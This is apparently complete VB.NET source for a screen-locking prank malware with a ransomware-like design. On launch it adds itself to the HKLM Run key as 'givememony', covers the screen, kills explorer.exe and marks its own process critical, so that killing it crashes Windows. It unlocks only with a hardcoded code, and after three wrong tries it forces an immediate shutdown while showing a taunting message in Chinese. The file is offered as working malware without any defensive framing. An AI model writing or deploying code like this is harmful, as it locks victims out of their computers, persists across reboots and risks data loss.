Imports System.Runtime.InteropServices

Public Class Form1
    Public Declare Function RtlSetProcessIsCritical Lib "ntdll" (<MarshalAs(UnmanagedType.Bool)> NewValue As Boolean, ByRef Oldvalue As Boolean, <MarshalAs(UnmanagedType.Bool)> pRtlSetProcessIsCritical As Boolean) As Long
    Public a As Long
    Private bingduKey As Microsoft.Win32.RegistryKey

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Process.EnterDebugMode()
        Dim key As Microsoft.Win32.RegistryKey
        key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("software\microsoft\windows\currentversion\run", True)
        key.SetValue("givememony", Application.ExecutablePath)
        bingduKey = key
        Me.Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
        Me.Location = New Point(0, 0)
        Shell("taskkill.exe /im explorer.exe /f", 0)
        RtlSetProcessIsCritical(True, Nothing, False)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Label10.Text = "机会有限哦，三次之后作为一个小小的惩罚就蓝屏一下"
        If TextBox1.Text = "1234567890" Then
            RtlSetProcessIsCritical(False, Nothing, False)
            bingduKey.DeleteValue("givememony")
            Shell("explorer.exe")
            End
        Else
            a = a + 1
        End If
        If a = 3 Then
            Shell("shutdown.exe /s /t 0", 0)
            Threading.ThreadPool.QueueUserWorkItem(Sub()
                                                       MsgBox("关机了",, "hahaha")
                                                   End Sub)
            Threading.Thread.Sleep(1000)
            End
        End If
    End Sub
End Class
